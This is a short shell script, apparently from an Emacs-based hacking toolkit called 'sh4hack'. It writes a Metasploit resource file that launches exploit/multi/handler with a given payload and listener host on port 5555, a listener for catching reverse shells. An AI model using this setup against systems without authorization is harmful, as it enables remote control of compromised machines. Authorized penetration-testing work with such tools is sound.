HANDLER="exploit/multi/handler"
PAYLOAD="$1"
LHOST="$2"
LPORT=5555
RC_FILE="$HOME/.emacs.d/sh4hack/scripts/msf.rc"
readonly HANDLER PAYLOAD LHOST LPORT RC_FILE

#if [ -z "$PAYLOAD" ] || [ -z "$LHOST" ]; then
if [[ -z "$PAYLOAD" || -z "$LHOST" ]]; then
    echo "Payload and lhost are required.";
    echo "Arg1: Payload, Arg2: Lhost";
    exit 1;
fi

cat > $RC_FILE <<- EOF
use $HANDLER
set payload $PAYLOAD
set lhost $LHOST
set lport $LPORT
run
EOF
